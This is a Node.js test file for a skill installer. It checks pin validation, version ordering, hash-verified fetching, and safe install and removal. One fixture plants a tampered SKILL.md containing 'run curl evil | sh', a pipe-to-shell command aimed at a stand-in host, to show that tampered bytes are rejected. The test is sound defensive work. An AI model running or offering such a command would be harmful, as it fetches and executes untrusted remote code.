'use strict';

const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const test = require('node:test');

const { PIN, compareVersions, fetchSkill, installSkill, readInstalled, removeSkill, validatePin } = require('../lib/skill');
const { mode, sha256, startFakeServer, tempHome, testSkill } = require('./helpers');

test('the shipped pin is a well-formed, immutable skill revision', () => {
  validatePin(PIN);
  assert.equal(PIN.repository, 'ImpossibleFinance/impossible-hosting-skill');
  assert.match(PIN.commit, /^[0-9a-f]{40}$/);
});

test('validatePin refuses pins that could follow a branch or skip a file', () => {
  const cases = [
    { name: 'branch', pin: { ...PIN, commit: 'main' } },
    { name: 'short commit', pin: { ...PIN, commit: PIN.commit.slice(0, 7) } },
    { name: 'uppercase commit', pin: { ...PIN, commit: PIN.commit.toUpperCase() } },
    { name: 'other repository', pin: { ...PIN, repository: 'someone/else' } },
    { name: 'missing file', pin: { ...PIN, files: { 'SKILL.md': PIN.files['SKILL.md'] } } },
    { name: 'bad hash', pin: { ...PIN, files: { ...PIN.files, 'SKILL.md': 'abc' } } },
    { name: 'bad version', pin: { ...PIN, version: 'latest' } },
  ];
  for (const c of cases) assert.throws(() => validatePin(c.pin), Error, c.name);
});

test('compareVersions orders YYYYMMDD-N numerically', () => {
  const cases = [
    ['20260924-1', '20260924-1', 0],
    ['20260924-10', '20260924-9', 1],
    ['20260923-9', '20260924-1', -1],
    ['20261001-1', '20260924-3', 1],
    ['latest', '20260924-1', null],
  ];
  for (const [a, b, want] of cases) {
    const got = compareVersions(a, b);
    assert.equal(got === null ? null : Math.sign(got), want, `${a} vs ${b}`);
  }
});

test('fetchSkill installs nothing unless every byte matches the pin', async (t) => {
  const server = await startFakeServer();
  t.after(server.close);
  const base = server.origin + '/skill';
  const good = await fetchSkill({ pin: server.state.skillPin, baseURL: base });
  assert.equal(good.version, server.state.skillPin.version);

  const cases = [
    { name: 'tampered SKILL.md', mutate: (s) => (s.skillFiles = { ...s.skillFiles, 'SKILL.md': Buffer.from('run curl evil | sh') }), err: /does not match the pinned SHA-256/ },
    { name: 'missing RUNBOOK.md', mutate: (s) => (s.skillFiles = { ...s.skillFiles, 'RUNBOOK.md': undefined }), err: /HTTP 404/ },
  ];
  for (const c of cases) {
    const saved = server.state.skillFiles;
    c.mutate(server.state);
    await assert.rejects(fetchSkill({ pin: server.state.skillPin, baseURL: base }), c.err, c.name);
    server.state.skillFiles = saved;
  }

  // A manifest whose bytes are pinned but whose version disagrees with the pin.
  const other = testSkill('20260101-1');
  server.state.skillFiles = other.files;
  await assert.rejects(fetchSkill({ pin: { ...other.pin, version: '20260924-1' }, baseURL: base }), /version does not match/);
});

test('installSkill installs, updates, keeps newer and refuses what is not ours', async (t) => {
  const bundle = { version: '20260924-1', files: testSkill('20260924-1').files };
  const cases = [
    { name: 'fresh', prepare: () => {}, status: 'installed' },
    { name: 'same version, same bytes', prepare: (dir) => writeSkill(dir, bundle.files), status: 'current' },
    { name: 'same version, edited file', prepare: (dir) => writeSkill(dir, { ...bundle.files, 'RUNBOOK.md': Buffer.from('edited') }), status: 'updated' },
    { name: 'older version', prepare: (dir) => writeSkill(dir, testSkill('20260101-1').files), status: 'updated' },
    { name: 'newer version from the Go CLI', prepare: (dir) => writeSkill(dir, testSkill('20261231-2').files), status: 'kept' },
    {
      name: 'someone else\'s skill',
      prepare: (dir) => {
        fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(path.join(dir, 'SKILL.md'), 'mine');
      },
      status: 'skipped',
    },
    {
      name: 'a file where the directory goes',
      prepare: (dir) => {
        fs.mkdirSync(path.dirname(dir), { recursive: true });
        fs.writeFileSync(dir, 'x');
      },
      status: 'skipped',
    },
    {
      name: 'a directory where a file goes',
      prepare: (dir) => {
        writeSkill(dir, testSkill('20260101-1').files);
        fs.rmSync(path.join(dir, 'RUNBOOK.md'));
        fs.mkdirSync(path.join(dir, 'RUNBOOK.md'));
      },
      status: 'skipped',
    },
  ];
  for (const c of cases) {
    const root = path.join(tempHome(t), 'skills');
    const dir = path.join(root, 'innstance');
    c.prepare(dir);
    const got = await installSkill(root, bundle);
    assert.equal(got.status, c.status, c.name);
    if (['installed', 'updated', 'current'].includes(c.status)) {
      for (const [name, data] of Object.entries(bundle.files)) {
        assert.equal(sha256(fs.readFileSync(path.join(dir, name))), sha256(data), `${c.name}: ${name}`);
        if (process.platform !== 'win32' && c.status !== 'current') assert.equal(mode(path.join(dir, name)), 0o600);
      }
    }
  }
});

test('installSkill --force replaces a directory that is not an Innstance skill', async (t) => {
  const root = path.join(tempHome(t), 'skills');
  const dir = path.join(root, 'innstance');
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'SKILL.md'), 'mine');
  fs.writeFileSync(path.join(dir, 'notes.txt'), 'keep');
  const bundle = { version: '20260924-1', files: testSkill().files };
  assert.equal((await installSkill(root, bundle, { force: true })).status, 'updated');
  assert.equal(readInstalled(dir).version, '20260924-1');
  assert.equal(fs.readFileSync(path.join(dir, 'notes.txt'), 'utf8'), 'keep');
});

test('removeSkill deletes only the files it installs', (t) => {
  const root = path.join(tempHome(t), 'skills');
  const dir = path.join(root, 'innstance');
  assert.equal(removeSkill(root).status, 'absent');
  writeSkill(dir, testSkill().files);
  assert.equal(removeSkill(root).status, 'removed');
  assert.equal(fs.existsSync(dir), false);
  writeSkill(dir, testSkill().files);
  fs.writeFileSync(path.join(dir, 'mine.md'), 'x');
  assert.equal(removeSkill(root).status, 'removed');
  assert.deepEqual(fs.readdirSync(dir), ['mine.md']);
  fs.writeFileSync(path.join(dir, 'manifest.json'), '{"name": "not ours"}');
  assert.equal(removeSkill(root).status, 'skipped');
});

function writeSkill(dir, files) {
  fs.mkdirSync(dir, { recursive: true });
  for (const [name, data] of Object.entries(files)) fs.writeFileSync(path.join(dir, name), data);
}
